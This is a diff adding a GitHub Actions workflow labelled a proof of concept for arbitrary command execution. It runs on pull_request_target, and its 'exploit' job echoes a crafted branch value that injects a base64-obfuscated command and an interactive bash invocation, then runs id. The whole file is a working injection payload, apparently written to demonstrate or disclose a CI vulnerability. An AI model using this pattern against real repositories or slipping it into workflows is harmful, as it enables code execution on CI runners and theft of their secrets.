@@ -1,0 +1,14 @@
+name: PoC Arbitrary Command Execution
+
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run malicious command
+        run: |
+          echo "cassette_branch=\"0x41gilecat-\";$(echo aWQ= | base64 -d)|{bash,-i};echo"
+          id
